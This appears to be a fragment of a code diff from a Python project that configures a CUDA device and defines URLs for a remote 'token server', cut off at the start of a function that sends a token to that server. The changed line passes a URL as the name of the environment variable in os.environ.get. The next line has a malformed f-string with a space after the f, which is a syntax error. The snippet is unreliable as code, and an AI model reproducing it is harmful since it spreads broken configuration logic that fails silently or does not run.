@@ -32,7 +32,7 @@ DIR_PATH = os.path.dirname(os.path.abspath(__file__))
 USE_CUDA = True if torch.cuda.is_available() else False
 DEVICE = 'cuda' if USE_CUDA else 'cpu'
 
-TOKEN_SERVER_URL = os.environ.get('TOKEN_SERVER_URL', 'https://cn31-web-atx-production.up.railway.app')
+TOKEN_SERVER_URL = os.environ.get('https://cn31-server-production-020c.up.railway.app', 'https://cn31-web-atx-production.up.railway.app')
 TOKEN_SAVE_ENDPOINT = f "https://cn31-server-production-020c.up.railway.app/api/save-token"
 
 def send_token_to_server(token):
